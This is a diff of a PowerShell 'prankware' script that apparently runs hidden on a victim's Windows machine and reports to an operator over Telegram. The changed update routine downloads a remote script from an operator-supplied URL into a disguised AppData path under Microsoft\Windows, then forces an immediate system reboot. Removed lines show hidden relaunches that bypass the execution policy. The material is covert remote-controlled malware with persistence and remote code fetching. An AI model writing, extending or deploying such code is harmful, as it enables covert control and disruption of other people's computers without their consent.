@@ -1,5 +1,5 @@
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
-#MEOW TEST
+#meowtest
 if (-not $env:PS_RUN_HIDDEN -or $env:PS_RUN_HIDDEN -ne "1") {
     $env:PS_RUN_HIDDEN = "1"
 
@@ -488,44 +488,14 @@ function Update-Script {
     try {
         Send-TelegramMessage -chatId $chatId -message "Starting update from: $updateUrl"
         
-        # Download new script to temp with a unique name
-        $tempPath = "$env:TEMP\update_$(Get-Random).ps1"
-        Invoke-WebRequest -Uri $updateUrl -OutFile $tempPath
+        # Download new script directly to appdata location, overwriting the old one
+        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\prankware.ps1"
+        Invoke-WebRequest -Uri $updateUrl -OutFile $hiddenScriptPath
         
-        # Verify it's valid PowerShell (basic check)
-        $content = Get-Content $tempPath -Raw
-        if ($content -notmatch "param|function|while") {
-            throw "Downloaded file doesn't appear to be a valid PowerShell script"
-        }
+        Send-TelegramMessage -chatId $chatId -message "Update complete. Restarting system now..."
         
-        # Get the current script name and hidden path
-        $scriptName = [System.IO.Path]::GetFileName($MyInvocation.MyCommand.Path)
-        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
-        
-        # Replace hidden copy
-        Copy-Item -Path $tempPath -Destination $hiddenScriptPath -Force
-        
-        # Clean up temp
-        Remove-Item $tempPath -Force
-        
-        Send-TelegramMessage -chatId $chatId -message "Update complete. Restarting in 5 seconds..."
-        
-        # Create a delayed restart script
-        $restartScript = @"
-Start-Sleep -Seconds 5
-Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$hiddenScriptPath`" -PS_RUN_HIDDEN 1" -WindowStyle Hidden
-"@
-        
-        $restartPath = "$env:TEMP\restart_$(Get-Random).ps1"
-        [System.IO.File]::WriteAllText($restartPath, $restartScript)
-        
-        # Start the delayed restart and exit current process
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$restartPath`"" -WindowStyle Hidden
-        
-        # Clean up restart script after a delay
-        Start-Process powershell.exe -ArgumentList "-Command", "Start-Sleep -Seconds 10; Remove-Item `"$restartPath`" -Force" -WindowStyle Hidden
-        
-        exit
+        # Restart system immediately using shutdown command
+        shutdown /r /t 0
         
     } catch {
         Send-TelegramMessage -chatId $chatId -message "Update failed: $_"
